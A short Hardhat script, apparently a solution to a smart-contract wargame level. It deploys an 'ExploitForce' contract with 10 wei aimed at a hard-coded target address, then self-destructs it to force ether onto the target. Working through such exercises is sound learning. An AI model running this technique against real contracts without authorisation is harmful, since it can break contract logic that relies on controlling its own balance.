import { ethers } from 'hardhat'
import { ExploitForce } from '../types/typechain/ExploitForce'

async function main() {
  const targetAddr = '0xf8A0a10D59840B31D1d3eAC321C71BD31aDA60D2'

  const factory = await ethers.getContractFactory('ExploitForce')
  const exploit = (await factory.deploy(targetAddr, {
    value: 10
  })) as ExploitForce

  console.log('Deploying contract...')
  await exploit.deployed()
  console.log(exploit.address)
  console.log('Contract deployed, executing exploit...')
  await exploit.selfdestruct()
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
